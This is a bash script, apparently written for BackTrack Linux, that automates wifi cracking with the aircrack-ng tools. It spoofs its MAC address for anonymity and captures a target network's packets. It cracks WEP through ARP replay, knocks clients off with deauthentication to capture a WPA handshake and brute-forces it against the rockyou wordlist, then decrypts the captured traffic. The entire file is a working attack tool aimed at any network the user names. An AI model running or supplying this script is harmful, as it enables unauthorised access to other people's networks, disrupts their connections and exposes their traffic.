#! /bin/bash

#This script is written to run in BackTrack

clear 	#clear the terminal

logo() {
cat <<"EOT"


 __      __         ___        
/\ \  __/\ \  __  /'___\ __    
\ \ \/\ \ \ \/\_\/\ \__//\_\   
 \ \ \ \ \ \ \/\ \ \ ,__\/\ \  
  \ \ \_/ \_\ \ \ \ \ \_/\ \ \ 
   \ `\___x___/\ \_\ \_\  \ \_\
    '\/__//__/  \/_/\/_/   \/_/
                               
                               
 ____                          __                      
/\  _`\                       /\ \                     
\ \ \/\_\  _ __    __      ___\ \ \/'\      __   _ __  
 \ \ \/_/_/\`'__\/'__`\   /'___\ \ , <    /'__`\/\`'__\
  \ \ \L\ \ \ \//\ \L\.\_/\ \__/\ \ \\`\ /\  __/\ \ \/ 
   \ \____/\ \_\\ \__/.\_\ \____\\ \_\ \_\ \____\\ \_\ 
    \/___/  \/_/ \/__/\/_/\/____/ \/_/\/_/\/____/ \/_/ 
                                                                                                                                                             
beag




EOT
}

logo

fakemac="00:11:22:33:44:55"

printf "Configure Wifi Card?\n"
read -p " y/n: " cardsetup
while [ $cardsetup != "y" -a $cardsetup != "n" ]
do
	echo "Is your wifi card configured?"
	read -p " y/n: " cardsetup
done

if [ $cardsetup = "y" ]
then
	airmon-ng stop mon0			#stop any instance of mon0
	airmon-ng stop wlan0			#stop the interface
	ifconfig wlan0 down			#bring the interface down
	echo "Faking mac"
	macchanger -m $fakemac wlan0 		#fake the mac address
	echo "Starting wlan0"
	airmon-ng start wlan0			#enable monitor mode on wifi card
fi

printf "\n"
echo "Do you want to scan?"
read -p " y/n: " scan
while [ $scan != "y" -a $scan != "n" ]
do
	echo "Do you want to scan?"
	read -p " y/n: " scan
done

if [ $scan = "y" ]
then
	gnome-terminal -x bash -c 'airodump-ng mon0; exec bash' #launch a new terminal and scan wifi networks
	#mon0 means no transmission which helps with anonymity
fi

printf "\n\n"
clear
echo "Enter details of target" 
read -p "BSSID: " bssid
read -p "Channel: " chnl
read -p "ESSID: " essid

#set the name of the cap file
capfile=$essid"-"$bssid

#open a terminal and listen only to the network we are interested in
#specifing the channel, mac and writing a cap file to disk which is info nessacerary for cracking purposes
gnome-terminal -e "bash -c \"echo 'Writing to file'; airodump-ng -c $chnl -w $capfile --bssid $bssid wlan0; exec bash\""

printf "\nOpening new terminal & writing cap file\n"
echo ""
echo 'Press Enter to continue...'
read -n1
ff
clear
printf "Open Wifi (1) Crack WEP (2) or WPA (3)\n"
read -p ": " crackwhat

while [ $crackwhat != "1" -a $crackwhat != "2" -a $crackwhat != "3" ] 
do
	echo "Open Wifi (1) or Crack WEP (2) or WPA (3)"
	read -p ": " crackwhat
done

if [ $crackwhat = "1" ]
then

	echo ""
	echo 'Press Enter to Remove Wireless Headers'
	read -n1

	#once the data has reached the magic number this command will crack the wep password
	airdecap-ng -b $bssid $capfile-01.cap

elif [ $crackwhat = "2" ]
then
	#open a new terminal 
	# -1 is fake authentication every 6000 seconds
	# -q sets aireplay to send keep-alive packets every 12 seconds
	# -o sets number of packets per burst
	# -a is the access points mac address
	gnome-terminal -e "bash -c \"echo 'Associating with router'; aireplay-ng -1 6000 -q 12 -o 1 -a $bssid wlan0; exec bash\""


	echo "Opening new terminal & assciating with AP"
	echo ""
	echo 'Press Enter once associated...'
	read -n1

	clear
	#open a new terminal
	# -3 command sets aireplay to use arp request replay attack
	# -x sets the number of packets per minute
	gnome-terminal -e "bash -c \"echo 'Arps'; aireplay-ng -3 -b $bssid -h $fakemac -x 150 wlan0; exec bash\""


	echo ""
	echo 'Press Enter if #Data column > 40,000'
	read -n1

	#once the data has reached the magic number this command will crack the wep password
	gnome-terminal -e "bash -c \"echo 'Cracking WEP'; aircrack-ng -b $bssid $capfile\"-01.cap\"; exec bash\""
	
	printf "\n"
	echo "Decrypt the traffic" 
	read -p "WEP Key: " wepkey

	airdecap-ng -w $wepkey $capfile-01.cap

	

elif [ $crackwhat = "3" ] 
then
	echo "Deauth someone"
	read -p "MAC to deauth: " macaddr

	gnome-terminal -e "bash -c \"echo 'Deauthing'; aireplay-ng -0 5 -a $bssid -c $macaddr wlan0; exec bash\""

	#once the handshake is captured and data has reached the magic number this command will crack the wpa password
		
	echo 'Press Enter once deauth sent...'
	read -n1

	gnome-terminal -e "bash -c \"echo 'Cracking WPA'; aircrack-ng -w /pentest/passwords/wordlists/rockyou.txt -b $bssid $capfile\"-01.cap\"; exec bash\""

	printf "\n"
	echo "Decrypt the traffic" 
	read -p "WPA Key: " wpakey
	
	airdecap-ng -e $essid -p $wpakey $capfile-01.cap

fi

printf "\n"
echo "Open file in Wireshark?"
read -p " y/n: " scan
while [ $scan != "y" -a $scan != "n" ]
do
	echo "Open file in Wireshark?"
	read -p " y/n: " scan
done

if [ $scan = "y" ]
then
	wireshark $capfile-01-dec.cap #open cap file in wireshark
fi









